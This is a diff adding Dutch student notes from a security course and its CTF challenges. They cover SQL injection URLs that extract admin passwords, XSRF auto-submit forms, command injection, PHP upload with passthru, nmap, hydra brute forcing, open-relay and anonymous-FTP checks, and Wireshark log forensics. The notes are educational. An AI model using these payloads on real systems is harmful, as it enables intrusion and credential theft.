@@ -1,0 +1,389 @@
+Aantekeningen:
+SQL injectie: 
+Door UNION: te gebruiken kan je een volgende sql query uitvoeren
+
+Door de volgende query uit te voeren kom je achter namen van de colums van een database
+select * from information_schema.columns where table_name = 'users'
+-- door '*' te gebruiken krijg je alle informatie van information_schema.columns terug
+-- in informatin_schema.columns staat --> TABLE_CATALOG	TABLE_SCHEMA	TABLE_NAME	COLUMN_NAME	ORDINAL_POSITION	COLUMN_DEFAULT	IS_NULLABLE	DATA_TYPE	CHARACTER_MAXIMUM_LENGTH	CHARACTER_OCTET_LENGTH	NUMERIC_PRECISION	NUMERIC_SCALE	CHARACTER_SET_NAME	COLLATION_NAME	COLUMN_TYPE	COLUMN_KEY	EXTRA	PRIVILEGES	COLUMN_COMMENT
+-- in column_name staat de naam van de velden door deze te gebruiken kan je makkelijk zien waar de wachtwoorden zijn opgeslagen
+
+wat je bij de opgave van thug4hire hebt gebruikt
+http://thug4hire.boris.certifiedsecure.org/message.php?thug=-1 UNION select COLUMN_NAME from information_schema.columns where table_name = 'thugs'LIMIT 1 offset 1
+
+Door de volgende query kan je de namen van de tabllen uit de database halen
+SELECT TABLE_NAME  FROM INFORMATION_SCHEMA.TABLES LIMIT 1 OFFSET 40
+Door offset 40 te doen kan je de database instellingen overslaan
+
+windows maakt gebruik van backslash :voorbeeld C:\map\map\map (windows heeft ook een file letter)
+linux maakt gebruik van forwardslash  : voorbeeld map/map/map
+
+boris contre lutter
+
+SQL 200:
+//vind tabel naam
+https://ctf.certifiedsecure.org/sql200/?id=-1%20UNION%20SELECT%20TABLE_NAME,TABLE_NAME,%20TABLE_NAME%20FROM%20INFORMATION_SCHEMA.TABLES%20LIMIT%201%20OFFSET%2040
+//vind velden
+https://ctf.certifiedsecure.org/sql200/?id=-1%20UNION%20select%20COLUMN_NAME,%20COLUMN_NAME,%20COLUMN_NAME%20from%20information_schema.columns%20where%20table_name%20=%20%27users%27
+//wachtwoorden staan in pass, en gebruikernaam in user
+//link om admin wachtwoord te krijgen
+https://ctf.certifiedsecure.org/sql200/?id=-1%20UNION%20select%20user,%20user,%20pass%20FROM%20users
+
+
+ip - internet protecol 
+wordt gebruikt voor de data comucatie over internet
+TCP - Transmission Control Protocol
+XSRF - Cross-site request forgery
+TCP - werkt bovenop ip en wordt gebruikt om verbindenen te maken TRANSMISSION CONTROL PROTOCOL 
+TCP poort - een poort voor een speciale functie
+SMTP - werkt bovenop TCP heeft poortnummer 25 en wordt gebruikt voor het versturen van mail
+FTP - werkt bovenop TCP heeft poortnummer 21 en wordt gebruikt voor het verzeden van grote bestanden, bestaat sinds 1971
+HTTP - protocol voor comunicatie tussen de webbrowser en webserver
+HTTPS - beveiligde versie van HTTP, hierdoor is het onmogelijk om de verbinding af te luisteren
+HTTP reqest - verzoek van de webbrowser naar de 
+GET - type http reqest dat bedoeld is om informatie op te halen
+POST - type http reqest dat bedoeld is om informatie te verzenden
+SESSION ID - een ID waardoor de webbrowser en webserver verbinding maken
+SAME ORIGIN POLICY - een browser beveileging die er voor zorgt dat javascript alleen toegang heeft tot pagina's en cookies wanneer deze van hetzelfde domein,protocol en poort komen
+CROSS SITE SCRIPTING - een kwestbaarheid waardoor je kwaadaardige javascript kan uitvoeren op een pagina
+
+
+TCP - FLAG
+
+SYN dan ga je een verbinding opzetten en dan stuur je een ACK terug - de server stuurt ook een SYN voor een verbinding naar de client
+ACK betekent dat de data is ontvangen 
+ontvang je geen ACK dan stuur je de data nog een keer
+FIN om een verbinding af te sluiten
+RST een reset als een eror is 
+Als de client een FIN doet dan kan de server nog steeds data sturen
+
+Als er niks op de poort draait, als de client een SYN stuurt maar er draait niks op de poort dan zal de server een RST terug sturen
+
+Bij een poort scan worden naar alle poorten een SYN gestuurd en wordt er gekeken naar wat de computer terug krijgt 
+
+Er komt niks terug - 2 mogelijkheden - 1. een server is druk ofzo en je paketje is veloiren 2. er zit een firewall tussen dan noem je het FILTERD 
+je kan ze uit elkaar halen door een paar keer je pakketjes te sturen want bij 1 zullen ze wel binnen komen en bij 2 zullen ze niet terug komen --> met terug komen bedoel ik een ACK terug 
+
+LES 20-9-2018 --> DATABASE: 
+exel heeft kolommen en rijen --> een database lijkt op exel maar werkt iets anders -->
+1. groot voordeel en en 1 groot nadeel
+
+een database controleerd op type input dus als je een int wil in een veld dan zal deze worden gecontroleerd, er zal dus nooit een char komem waar een int hoort
+
+een sql injection:
+de output van een site kan een input zijn van een andere website
+
+VOORBEELD:
+SELECT ID FROM users WHERE = " OR 1 = 1;
+
+SELECT naam FORM users WHERE .... // hier krijg je er 1 terug
+Door een string escape kan je sql injecties voorkomen
+
+PORT SCANNING:
+voor port scanning kan je ~nmap [ip] -- Dit is voor de 1000 meest gebruikte tcp poorten 
+door [-p] toe te voegen kan je specificeren welke poorten er worden gescand VOORBEELD: ~nmap [ip] -p 25,26 hierbij wordt gekeken naar poort 25 en 26
+door een [-] (een min) te gebruiken kan je een range/berijk aangeven: VOORBEELD ~nmap [ip] -p 25-30 hierbij worden alle poorten bekeken 
+door bij de [-](een min) geen begin en einde te specificeerd dan zal hij van het begin van het einde scannen
+
+
+DATE MY PORTS:
+voor het port scanning:
+~$ nmap 178.33.147.188 -p- // deze zal alle poorten scannen
+de poort die gevonden wordt is 65080
+Door een sql injectie te doen kom je er in
+'OR ''='
+er zit een cros site scripting fout in het maken van een account
+Door de ACCESSTOKEN te veranderen kom je in de admin interface
+Door de volgende sql injectie te doen kom je bij de table naam
+-1' union select table_name, table_name, 3, 4 
+from information_schema.tables#
+Door de volgende query uit te voeren krijg je de veldnamen
+1' UNION select COLUMN_NAME, COLUMN_NAME, 3, 4 from information_schema.columns where table_name = 'user'#
+wachtwoord staat in 
+password staat in: the_password_column_nobody_is_going_to_guess
+door de volgende query uit te voeren kan je het wachtwoord lezen
+-2' UNION ALL SELECT id,name,the_password_column_nobody_is_going_to_guess ,login FROM user#
+wachtwoord: saturdayisthebestdayoftheweek
+
+VIDEO vastleggen Netwerkverkeer;
+met het comando tcpdump kan je al het netwerkverkeer op je eigen systeem vasleggen
+om een overzicht te krijgen van je netwerkkaarten kan he ifconfig gebruiken (ubuntu)
+
+volgende commando om tcpdump te gebruiken
+tcpdump -i eth0 -s 0 -w packets.pcap
+de [eth0] is je internet kaart 
+en de [-s 0] geeft aan dat hij de volledige internet pakketen moet opslaan,
+geef je dit niet mee dan slaat hij eerste 64 bits op van het internetpaket
+door [-w packets.pcap] te schrijven geef je aan dat hij de informatie moet wegschrijven in een bestand dat packets.pcap heet
+
+tcpdump stop je door op cntl + c te drukken
+
+
+VIDEO Analyseren netwerkverkeer;
+pcap bestanden kan je openen met een programma dat wireshard heet
+het scherm is onderverdeeld in 3 delen 
+het bovenste deel geeft alle pakketen in het netwerkverkeer
+onderin zien we de inhoud van het pakket
+het middelste deel geeft aan wat het onderste deel nou eigenlijk betekent 
+
+COSMO challenge:
+Bekijk in wireshark wie heel veel poorten op vraagt, je ziet dat 192.168.22.131 heel veel verschillende poorten vraagt 
+Sorteerd op tcp en op source en dan zie je dat poorst 8080 22 open zijn
+
+daarna kan je in de shell naar /mnt/var/log gaan en daar kan je naar auth.log hier kan je de openen en zie je zijn ip en kan je zijn username uitlezen
+username is: admin
+http.request.method == "POST" <-- filter op post
+daarna kijken waar login.php wordt verzonden
+
+daarna kijk je bij het volgende login.php verzoek en daar zie je guest
+
+als je bij wp-admin/post kijkt in de html zie je dat hij ../ doet in zijn url dat betekent dat hij een path traversal aanval doet
+
+met http.request.uri.query == "p=4" vind je alle URL /?p=4. zoek hier de laaste van en vul deze in
+dan in follow --> tcp stream kijk waar deze veranderd wordt en zoek voor een verandering in de <head></head>
+dit doe je door naar bendenen te scrollen
+
+je kan vestanden openen in de shell door vi [bestandsnaam]
+
+Ga naar de /mnt/var/log
+Hier zie je een bestand auth.log hier staan alle inlogpogingen
+je kan zien dat iemand veel foute pogingen heeft gedaan, dit is de aanvaller
+zijn ip: 192.168.22.8
+
+je ziet ook in de log dat de username cosmo is en dat is dus degene van wie het wachtwoord voor wordt achterhaald
+
+In de auth.log wordt ook de bewerkingen bij, hier kan je zien wat hij doet 
+Hij doet: vi /var/www/index.php
+
+Als je de path volgt kan je hem met functie cat openen en dan lees je 
+Cosmo, your password is weak!
+
+
+VIDEO XSRF
+
+XSRF --> cross site request forgery
+het is het probleem waarbij één websites acties kan uitvoeren op een andere website
+
+Voorbeeld:
+<a href="https://example.com/delete?id=1">click me </a>
+als je op deze link zou klikken dan zou je van example.com het eerste item verwijderen
+Maar de gebruiker moet hier nog wel op klikken als je het in een <img> doet, dan hoeft de gebruiker alleen nog maar de pagina te laden
+<img src="https://example.com/delete?id=1"></img>
+
+maar wat als de browser een post gebruikt
+dan kan het niet meer met een plaatje <img>
+je kan wel een formulier maken en deze met javascript verzenden 
+
+Voorbeeld:
+<form id="my-form" method="post" action="https://example.com/delete">
+<input type="hidden" name="id" value="1"></input>
+</form>
+<script> document.getElementById("my-form").submit();</script>
+
+XSRF kan verholpen worden met het gebruik van tokens, een token is een stukje random data.
+Voor iedere sessie (en voor iedere gebruiker) maak je een nieuwe token aan, als je een post gebruikt moet deze ook de token bevatten maar deze weet je niet dus kan je de aanval niet uitvoeren
+
+
+VIDEO Web insecurity
+
+Command injection --> als je een veld een command uitvoerd kan je met een punt comma ; het eerste commando afbreken en daar een nieuw commando invoeren
+Id <-- dit commando geeft de gebruiker
+sleep (30) <-- zelfe als delay
+
+Uploaden bestanden
+
+Php bestanden uploaden die deze misscien wel worden uitgevoerd kunnen worden door de server
+phpinfo(); geeft de configuratie van php
+met passthru(); kunnen systeem commandos worden uitgevoerd
+passthrue("id"); zal het commando id uitvoeren en ons de uitvoer teruggeven
+
+Van Zant Bank & Finance
+
+Kijk in de scource van de website, neem de javascript en nicefy de javascript en dan zie je dat het wachtwoord "noevilbankinghere" is
+
+verander in betalingen het accountid naar 1 en he zit in het account van de hoofdgebruiker
+
+De onderstaande link kan worden gebruikt om in de beschrijving te plaatsen en als gebruiker 1 er dan op klikt dan wordt het geld naar jouw overgemaakt
+
+LINK:
+https://bank.certifiedsecure.org/invited/transfers/send?submitted=transfer&to_user_id=1&amount=1&description=Hallo%21+Hier+is+je+geld%21+Oh%2C+en+bekijk+%5Burl%3Dhttps%3A%2F%2Fwww.certifiedsecure.com%5Ddeze%5B%2Furl%5D+site+eens%21&submit=Verstuur
+
+Voer een php bestand in (staat in dezelfde map heet prof.php)
+en voer het commando 'victory_nl 578' uit
+
+ga naar je profiel en open de link naar je profiel foto daar staat de volgende link
+LINK:
+https://bank.certifiedsecure.org/invited/?victory=9 
+
+LES 27-09-18
+
+cross site scripting --> niks meer dan java script injecteren in een database
+
+LES 4-10-2018
+
+Cross site scripting is een fout waarbij je javascript kan injecteren in de website je kan dan
+BIJVOORBEELD:
+ - token stelen
+
+
+BUILD THAT FIREWALL
+Het is goed als je firewall standaard alle pakketten niet doorlaat maar alleen de pakketen waarvan jij aangeeft dat ze door mogen
+
+iptables -p INPUT DROP
+iptables -p OUTPUT DROP
+iptables -p FORWARD DROP
+iptables -f
+
+Inkomende verbindingen naar poort 80 (TCP) van de webserver zijn toegestaan
+iptables -A INPUT -p tcp --dport 
+
+LES 11-10-18
+
+Network Analysis:
+
+gebruik wireshark en sorteer op http protocol
+"/etc/passwd" wordt gelezen
+
+door in wireshark te bekijken en te filterern op tcp.response.code
+zie je dat user wordt gekraakt
+
+als je filtert op tcp.ack == 1
+dan zie je alle poorten die open zijn
+
+21
+22
+80
+111
+
+Sequerity web:
+
+kijk in de /mnt/var/log voor alle log bestanden
+daar kan je ook de log bestanden zien van apache
+in deze folder kan je acces.log vinden
+als je gewoon op chrome ctrl + f doet dan kan je zoeken op select om een sql injection aanval te vinden
+
+Voor de volgende opdracht kan je in de log file het auth.log bestand openen
+door cat [bestand] te doen kan je open je het bestand in een text editor
+als je cat uit wil moet je :q doen!
+
+het ip address dat je dan vind is 192.168.22.11 
+Daarnaast staat bert dan is dat het antwoord op de volgende vraag
+
+door het bestand te openen met cat vind je dat het veranderd is naar haxored!  
+
+Video UDP port scanning:
+
+Een TCP connectie opzetten:
+De computer stuurt een SYN naar de server,
+De server stuurt een SYN en een ACK terug,
+En dan stuurt de computer weer een ACk naar de computer
+
+Bij UDP stuurt de computer gewoon data, en als de server er zin in heeft stuurt hij data terug
+en als je random data stuurt zal de server geen data terug sturen want die data begrijpt hij niet
+Als je data stuurt naar een poort waar geen dienst op draait dan zou je een ICMP poort unreachable terug moeten krijgen
+Maaro vaak worden de ICMP port unreachable pakketten geratelimit (er kunnen niet in 1 seconden 65000 van dit soort berichten gestuurd worden)
+en veel firewalls houden deze paketten tegen
+
+Om een poort scan uit te voeren kan je beter pakketen sturen waarvan je verwacht dat de server een reactie terug stuurt
+Daarvoor maken we gebruik van de UDP proto scanner 
+
+als we die tool willen gebruiken gaan we naar upp-protoscanner.pl en dan het ip adress er achter wat we willen scannen
+
+Video Server INSECURITY:
+In deze video:
+mail servers met open relays
+ftp servers met annonieme toegang
+accounts met makkelijk te raden wachtwoorden
+
+een open relay op een mailserver is een server die mail accepteert van iedereen op het internet
+en die weer bezorgt bij andere mensen
+
+Open relays worden vaak gebruikt door spammers
+Om te testen of een mail server een open relay is kan je het beste even een mailtje sturen
+dat doen we met telnet [ip] [poort]
+
+dan typen we helo en dan nog iets
+dan moeten we opgeven waar de mail vandaan komt dant doen we met
+mail form: [email]
+vervolgens moeten we opgeven waar de mail naartoe moet dat doe je met
+rcpt to: [email]
+vervolgens doe je data en dan begint je echte mail
+eerst moet je een paar headers er in stoppen
+Subject: Test
+From: testing@example.com
+
+Sluit nu af met een lege regel en nu komt de body
+Voorbeeld: Dit is een test
+
+om de body ad te sluiten doe je een punt [.]
+en dan quit
+
+en als de email in onze eigen mailbox verschijnt dan weten we dat het een openrelay
+
+annonieme toegang tot je ftp
+
+opzich is er niks mis mee als iedereen iets kan downloaden maar als je iedereen laat uploaden dan is het vragen om probelemen
+
+Om het te testen typen we in 
+ftp [ip]
+daarna kiezen we ftp of ananymous
+het wachtwoord maakt dan niet uit
+password
+
+met ls kunnen we de bestanden zien
+ 
+om te testen of we bestanden kunnen uploaden 
+kunenn we put commando gebruiken
+remote-file [bestand]
+local-file [bestand]
+
+accounts met onveilige wachtwoorden
+
+om een scan uit te voeren gebruiken we hydra
+
+hydra -l [gebruikersnaam] -p [wachtwoord] [ip] [protocol]
+
+Door een hooftletter -P kan je een bestand invoeren met 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
